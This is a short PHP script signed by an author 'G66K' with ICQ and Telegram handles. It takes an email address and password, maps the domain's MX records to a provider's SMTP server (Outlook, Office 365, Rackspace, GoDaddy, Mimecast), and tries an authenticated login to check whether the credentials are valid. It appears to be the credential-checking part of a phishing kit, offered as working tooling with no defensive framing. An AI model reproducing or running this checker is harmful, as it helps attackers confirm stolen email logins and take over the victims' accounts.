<?php
ob_start();
# Author: G66K
# ICQ: 747246257
# TeleGram: G66k1337
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require '.J/autoload.php';
function JmT($e,$p){
        $out=JmG($e);
        if(count($out)>1){
           $r=JMC($out[0], $e, $p);
		   return ["e"=>$r,"n"=>$out[1]];
        }else if(count($out)>0){
			return ["e"=>false,"n"=>'Other Domain'];
		}else{
			return ["e"=>false,"n"=>'error'];
		}
}

function JMC($host, $username, $password){
    $maxJM = new PHPMailer(true);
    try {
        $maxJM->isSMTP();
        $maxJM->Host       = $host;
        $maxJM->SMTPAuth   = true;
        $maxJM->Username   = $username;
        $maxJM->Password   = $password;
        $maxJM->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $maxJM->Port       = 587;
        $maxJM->smtpConnect();
        unset($maxJM);
		return true;
    } catch (Exception $e){
        unset($maxJM);
		return false;
    }
}


function JmG($email){
    $domain=substr_count(strtolower($email),"@")?@end(explode("@",strtolower($email))):strtolower($email);
    if(!substr_count($domain, ".")){return [];}
    if(substr_count($domain,"outlook.")||substr_count($domain,"hotmail.")||substr_count($domain,"live.")||substr_count($domain,"msn.")){return ["smtp-mail.outlook.com","Outlook"];}
    getmxrr($domain,$mx_detail);
    $mx_details=print_r($mx_detail, true);
    if(substr_count($mx_details, "olc.protection.outlook.com")){unset($mx_details,$mx_detail);return ["smtp-mail.outlook.com","Outlook"];}
    if(substr_count($mx_details, ".protection.outlook.com")){unset($mx_details,$mx_detail);return ["smtp.office365.com","Office 365"];}
    if(substr_count($mx_details, ".ppe-hosted.com")){unset($mx_details,$mx_detail);return ["smtp.office365.com","Office 365"];}
    if(substr_count($mx_details, ".gslb.pphosted.com")){unset($mx_details,$mx_detail);return ["smtp.office365.com","Office 365"];}
    if(substr_count($mx_details, ".arsmtp.com")){unset($mx_details,$mx_detail);return ["smtp.office365.com","Office 365"];}
    if(substr_count($mx_details, "emailsrvr.com")){unset($mx_details,$mx_detail);return ["secure.emailsrvr.com",'Rackspace'];}
    if(substr_count($mx_details, ".secureserver.net")){unset($mx_details,$mx_detail);return ["smtpout.secureserver.net","Godaddy"];}
    if(substr_count($mx_details, "mimecast.com")){unset($mx_details,$mx_detail);return ["us-smtp-outbound-1.mimecast.com","Mimecast"];}
    if(strlen(trim($mx_details))<10){
        return [];
    }else{
        unset($mx_details,$mx_detail);return ["unknown"];
    }
}

